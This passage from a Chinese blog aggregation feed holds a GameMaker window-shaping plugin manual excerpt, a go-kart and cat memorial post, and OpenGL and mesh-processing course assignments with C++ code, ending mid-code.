<p>由于 GM 运行原理所致，游戏绘制的内容并不会在绘制语句执行的瞬间显示出来，而是要等到当前 Step 所有绘制完成后才会刷新绘制缓存以显示绘制的内容。这意味着窗口外形的更新需要与绘制内容的刷新同步发生，否则就会发生窗口形状与所显示内容有所偏差的问题（比如游戏仍然显示的是上一帧的内容，但是窗口形状已经被裁剪成了下一帧所需的形状）：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="286" height="262" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" alt="" class="wp-image-669"/></a><figcaption> <br>绘制内容与窗口形状没有同步更新 </figcaption></figure></div>



<p>由于 Windows 窗口外形更新时机所限，本插件需要在 GM 的每个 Step 中，于每个 Step 开始 （Begin Step）至 Draw 系列事件开始之前对窗口形状进行更新，以保证窗口形状的更新与绘制内容的更新能够同步完成。如果在 Draw 系列事件中进行窗口形状的修改，则会发生窗口形状与绘制内容不同步的问题，请务必注意。建议在 End Step 事件之中更新窗口形状。</p>



<p>再次提示，请<strong>不要</strong>在 Draw <strong>系列</strong>事件中更新窗口形状！除非你十分清楚可能发生的后果！</p>



<h3>2.4 复杂遮罩</h3>



<p>多次执行以下任意核心函数来改变窗口形状，则后一次的遮罩将会覆盖前一次的遮罩，<strong>并不会</strong>互相叠加：</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // 仅限 GMS
</pre></div>


<p>这意味着如果所需的遮罩是由多个元素组合而成的复杂形状，则需要开发者自行准备好已经事先组合好所有元素的<strong>单张</strong> Sprite / Surface 用作实际的遮罩。</p>



<p>举例来说，如果你需要在屏幕上显示两位女牛仔，那么你需要准备如下的<strong>一张</strong> Sprite / Surface 作为遮罩：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="640" height="480" src="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" alt="" class="wp-image-678" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/complex-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>复杂遮罩</figcaption></figure></div>



<p>连续调用两次 NF_WS_ShaveWindow_* 函数并不能实现如上所述的需求。假设第一次传入了左侧牛仔的遮罩，第二次传入了右侧的遮罩，则只有右侧会正常显示出来，而第一次设置的遮罩会被覆盖而失效。</p>



<hr class="wp-block-separator"/>



<h2>3. 常见问题</h2>



<ol><li>使用 Sprite 做遮罩时要注意所用 Sprite 的 xoffset 和 yoffset。</li></ol>
<p><a rel="nofollow" href="https://www.noisyfox.io/foxwinshave2.html">FoxWinShave 2 中文使用手册</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/</id>
        <title><![CDATA[智能合约攻击面及ctf出题指南]]></title>
        <updated>2019-01-03T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"/>
        <content type="text/html" src="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"><![CDATA[智能合约攻击面及ctf出题指南]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/</id>
        <title><![CDATA[卡丁车与猫]]></title>
        <updated>2018-11-25T13:28:17+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"><![CDATA[<p>本来打算拿纸做个架子把手机固定在帽子上全程拍摄<br>然而过弯力度太大手机左晃右晃最后还是甩了出去<br>就文字分享一下俊航卡丁车的体验吧<br>上车后工作人员发车发了好几次都没发着有点小尴尬<br>第一脚听到油门马达的轰鸣声立刻有种驾驭野兽的感觉<br>先不急第一圈模仿f1暖胎<br>在赛道上左右摇摆鲨鱼巡航<br>室内赛道长度较短但路面平整得甚至反光很适合漂移<br>车身很稳地摇完第一圈<br>第二圈开启运动模式<br>原谅我是个键盘车手油门只会踩到底<br>加速感超强入第一个弯前速度估计有30迈<br>减速 贴边 猛打方向盘 油门踩到底 方向盘反打<br>结果差点飘了180度<br>但还是不可避免的撞了路边轮胎<br>熟悉手感后就放开了<br>虽然地方小但弯道的布置很合理<br>漂移时skrskrskr~很刺激~<br>努力充分利用赛道感觉自己走线还可以~<br>我为车狂！！！</p><hr><p>一年前的12月，大寝有人从火锅店老板那里收了只幼猫，从此开始了有猫陪伴的日子。<br>如今猫咪已经不在，贴点照片和视频表达一下对它的想念。</p><iframe src="//player.bilibili.com/player.html?aid=35436376&cid=62120907&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe><p><img src="https://qiniu.karlrixon.cn/blog/181106/l7Eakg44il.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/mFfbFG81B7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/dl7LHkc4mj.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/fI83g5gcDB.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/cd0Kmd8igj.png?imageslim" alt="mark"></p><p>这张好丑233</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/d0LbeC0d43.png?imageslim" alt="mark"></p><p>台灯下就适合思考</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DHHk9LAKgf.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/J8L798EBda.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/Djem79cGa6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/2460HE0mfJ.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/EdCAhFh0Bh.png?imageslim" alt="mark"></p><p>尝试最舒服的睡姿。。</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/EeDAkDB6bc.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/8cFBhjj9Ac.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HGJ0gIK2bI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/aE8bf81maD.png?imageslim" alt="mark"></p><p>枕着算法书睡觉</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DIbjJ6Cjhk.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/deAFbCe92G.png?imageslim" alt="mark"></p><p>我是0排捷豹QAQ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/0kghK3mdKE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HIdB16aLb7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/4BBIk4L2CE.png?imageslim" alt="mark"></p><p>专心点！</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/jj036eiHGj.png?imageslim" alt="mark"></p><p>你愁啥</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bJ1iibhiCH.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DFLAIjKdjI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0alG7LB41h.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/h50ghHDb7a.png?imageslim" alt="mark"></p><p>这是老鼠吗</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/7khdeha147.png?imageslim" alt="mark"></p><p>老鼠就这味？</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/BD6H22j4Bi.png?imageslim" alt="mark"></p><p>你骗谁呢</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bklELf1b5K.png?imageslim" alt="mark"></p><p>悟空</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/Lb9162KEC6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0Ddb9CgJFb.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/m43dfK70cb.png?imageslim" alt="mark"></p><p>想你了喵</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/CHj5e6cEde.png?imageslim" alt="mark"></p>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/Todo-List/</id>
        <title><![CDATA[Todo List]]></title>
        <updated>2018-11-23T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/Todo-List/"/>
        <content type="text/html" src="https://doublemice.github.io/Todo-List/"><![CDATA[Todo List]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/The-road-to-linux-kernel-exploit/</id>
        <title><![CDATA[The Road To Linux Kernel Exploit]]></title>
        <updated>2018-11-22T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"/>
        <content type="text/html" src="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"><![CDATA[The Road To Linux Kernel Exploit]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/</id>
        <title><![CDATA[竞速游戏录屏剪辑]]></title>
        <updated>2018-11-11T11:07:14+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=27825157&cid=48041818&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/</id>
        <title><![CDATA[OpenGL设计小屋场景]]></title>
        <updated>2018-11-11T11:06:00+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"><![CDATA[<h2 id="Grading-Scheme"><a href="#Grading-Scheme" class="headerlink" title="Grading Scheme"></a>Grading Scheme</h2><p>Your assignment will be graded by the following marking scheme:<br>Basic (80%)</p><ul><li>Planes (the left, right, and back walls, the ceiling and the floor)  10%</li><li>At least five different geometric primitives                  20%</li><li>At least five keyboard events (mouse event is optional)        15%</li><li>Object transformation animation (rotation, translating, scaling)  15%</li><li>General lighting control (different material properties setting)   20%</li></ul><p>Bonus (Up to 20%)</p><ul><li>Well-organized room                                       5%</li><li>Complex meaningful object constructed by different primitives      5%</li><li>Additional light (with different properties, on/off or transformation)  10%</li><li>Other creativities                                           10%</li></ul><p>Total                                                       100%<br>Note: No grade will be given if the program is incomplete.</p><h2 id="代码框架解读"><a href="#代码框架解读" class="headerlink" title="代码框架解读"></a>代码框架解读</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;GL/glut.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> GLdouble FRUSTDIM = <span class="number">100.0f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// All Setup For OpenGL Goes Here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glEnable(GL_DEPTH_TEST);</span><br><span class="line">glEnable(GL_LIGHTING);</span><br><span class="line">glEnable(GL_LIGHT0);</span><br><span class="line">glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// Here's Where We Do All The Drawing</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Place light source here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Draw walls and objects here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Add animation here</span></span><br><span class="line"></span><br><span class="line">glutSwapBuffers();</span><br><span class="line">glFlush();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reshape</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> h)</span> <span class="comment">// Resize the GL Window. w=width, h=height</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glViewport(<span class="number">0</span>, <span class="number">0</span>, (GLsizei) w, (GLsizei) h);</span><br><span class="line">glMatrixMode(GL_PROJECTION);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">glFrustum(-FRUSTDIM, FRUSTDIM, -FRUSTDIM, FRUSTDIM, <span class="number">320.</span>, <span class="number">640.</span>);</span><br><span class="line">glMatrixMode(GL_MODELVIEW);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">keyboard</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> key, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> <span class="comment">// Handle the keyboard events here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> (key) </span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span>'\<span class="number">033'</span>:<span class="comment">//press 'esc' to quit</span></span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">   <span class="comment">// Add keyboard control here</span></span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Initialization of GLUT Library */</span></span><br><span class="line">glutInit(&amp;argc, argv);</span><br><span class="line">glutInitDisplayMode(GLUT_RGBA|GLUT_DOUBLE|GLUT_DEPTH);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Create a window with title specified */</span></span><br><span class="line">glutCreateWindow(<span class="string">"Assignment 1"</span>);</span><br><span class="line">glutInitWindowSize(<span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">glutInitWindowPosition(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">init();<span class="comment">/*not GLUT call, initialize several parameters */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Register different CALLBACK function for GLUT to response </span></span><br><span class="line"><span class="comment">with different events, e.g. window sizing, mouse click or</span></span><br><span class="line"><span class="comment">keyboard stroke */</span></span><br><span class="line">glutReshapeFunc(reshape);</span><br><span class="line">glutDisplayFunc(display);</span><br><span class="line">glutKeyboardFunc(keyboard);</span><br><span class="line">glutIdleFunc(idle);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Enter the GLUT event processing loop which never returns.</span></span><br><span class="line"><span class="comment">it will call different registered CALLBACK according</span></span><br><span class="line"><span class="comment">to different events. */</span></span><br><span class="line">glutMainLoop();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改和补充"><a href="#修改和补充" class="headerlink" title="修改和补充"></a>修改和补充</h2><p>作业框架中的一处bug：<code>main</code>函数中<code>glutCreateWindow</code>应当在<code>glutInitWindowSize</code>和<code>glutInitWindowPosition</code>之后。</p><p>在init函数中添加<code>glEnable(GL_NORMALIZE);</code>，<code>glEnable(GL_NORMALIZE)</code>是使<code>opengl</code>自动normalize 法向量，之所以需要自动normalize 法向量是因为法向量会受到<code>glScalef</code>的影响，当<code>glScalef</code>将物体的坐标放大k倍时，法向量变为1/k，因为opengl自己的光照计算要求法向量单位化，所以不重新单位化，计算结果就是错误的。<br>举个例子就是如果不添加<code>glEnable(GL_NORMALIZE);</code>在<code>display</code>函数中放大一个几何物体它的亮度就会变暗。</p><p>在<code>display</code>函数中添加<code>glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</code>用于清除缓冲区。</p><p>在<code>display</code>函数中所有代码外套一个<code>glPushMatrix();</code>和<code>glPopMatrix();</code>保证每次回调时的矩阵栈为空。</p><h2 id="程序一：动画效果演示"><a href="#程序一：动画效果演示" class="headerlink" title="程序一：动画效果演示"></a>程序一：动画效果演示</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/%E4%BD%9C%E4%B8%9A%E4%B8%80/%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C" target="_blank" rel="noopener">源码</a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/0bFl5AJ2L5.png?imageslim" alt="mark"></p><h2 id="程序二：3D-room-scene"><a href="#程序二：3D-room-scene" class="headerlink" title="程序二：3D room scene"></a>程序二：3D room scene</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/作业一/房间设计" target="_blank" rel="noopener">源码</a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/h4G05EK5Cb.png?imageslim" alt="mark"></p><iframe src="//player.bilibili.com/player.html?aid=34258956&cid=60010777&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/</id>
        <title><![CDATA[计算机图形学finalal_project:MeshViewer]]></title>
        <updated>2018-11-09T12:03:21+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"><![CDATA[<h2 id="代码解读"><a href="#代码解读" class="headerlink" title="代码解读"></a>代码解读</h2><p>a.首先从<code>meshviewer.cpp</code>看起，里面包含main函数入口，打印使用说明，设置窗口信息，初始化灯光材质等信息，创建菜单，绘制图像，窗口大小变化回调，鼠标点击和移动回调，默认回调，键盘回调，网格模型处理，主循环</p><p>b.然后要读懂的是<code>MeshInterface.h</code>文件，包含网格模型处理的操作，了解<code>glNewList</code>和<code>glCallList</code></p><p>c.接着看内核头文件，<code>Kernal.h</code>和<code>ExKernal.h</code>里包含了所有后面写代码要用到的函数声明，<code>Kernal.h</code>中要注意的是何种半边句柄的转换函数，<code>ExKernal.h</code>中的高级功能函数需要了解</p><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>a.其中1. 2. 4. 5的函数声明在 mesh/extension/ExKernelT.h (截图如下)<br>函数实现请在mesh/extension/ExkernelT.cpp 中完成 (务必)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/ie20LdjLk0.png?imageslim" alt="mark"></p><p>b.其中3的函数声明在read_write/read_write.h<br>函数实现请在read_write/read_write.cpp 中完成 (务必)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/JmeG2b7D19.png?imageslim" alt="mark"></p><p>c.请把整个代码看明白，里面实现了各种基本操作，例如求三角网格中每个三角形的重心、求每个三角面片的法向等等。</p><p>d.程序运行截图如下：</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/eaf9Ghl9AG.png?imageslim" alt="mark"></p><p>e.鼠标点击右键，会出现一个操作界面，里面有一些灯光和其他绘制效果。</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/Gga208dGIg.png?imageslim" alt="mark"></p><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><blockquote><p>计算三角网格中每个三角形(face)的面积；10分</p></blockquote><p>此函数声明为： Scalar calc_facet_area(const FacetHandle&amp; _fh); //给定一个三角面片，计算它的面积<br>Tips: 可以根据程序输出结果判定是否计算正确，例如，输入模型cow.off，它的所有三角面片中，面积最大的三角面片的面积为：The maximal area of the mesh is: 0.0494426</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Scalar</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_facet_area(<span class="keyword">const</span> FacetHandle&amp; _fh)&#123;<span class="comment">/////计算三角形的面积</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">///得到半边句柄</span></span><br><span class="line">    HalfedgeHandle&amp; hh1 = halfedge_handle(_fh);</span><br><span class="line">    HalfedgeHandle&amp; hh2 = next_halfedge_handle(hh1);</span><br><span class="line">    HalfedgeHandle&amp; hh3 = next_halfedge_handle(hh2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////由半边句柄得到边句柄</span></span><br><span class="line">    EdgeHandle&amp; eh1 = edge_handle(hh1);</span><br><span class="line">    EdgeHandle&amp; eh2 = edge_handle(hh2);</span><br><span class="line">    EdgeHandle&amp; eh3 = edge_handle(hh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////由边句柄得到各边长</span></span><br><span class="line">    <span class="keyword">float</span> a = calc_edge_length(eh1);</span><br><span class="line">    <span class="keyword">float</span> b = calc_edge_length(eh2);</span><br><span class="line">    <span class="keyword">float</span> c = calc_edge_length(eh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////利用海伦公式求面积s=sqrt(p(p-a)(p-b)(p-c))</span></span><br><span class="line">    Scalar area = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> p = (a + b + c) / <span class="number">2</span>;</span><br><span class="line">    area = <span class="built_in">sqrt</span>(p*(p - a)*(p - b)*(p - c));</span><br><span class="line"></span><br><span class="line">    facet_ref(_fh).area_ = area;</span><br><span class="line">    <span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/d8DIbDC712.png?imageslim" alt="mark"></p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><blockquote><p>计算三角网格中每个顶点(vertex) 的法向；20分</p></blockquote><p>此函数声明为：inline Normal calc_normal(const VertexHandle&amp; _vh);///计算顶点的法向值<br>Tips: 注意归一化。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Normal</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_normal(<span class="keyword">const</span> VertexHandle&amp; _vh) &#123;<span class="comment">////更新一个顶点的法向</span></span><br><span class="line">    assert( _vh.is_valid());</span><br><span class="line">    assert( _vh.idx() &lt; vertex_size() );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Normal          norm(1,1,1);///////用norm存储求得的法向值</span></span><br><span class="line">    <span class="function">Normal          <span class="title">norm</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////在此实现////////////////////////////////////</span></span><br><span class="line">    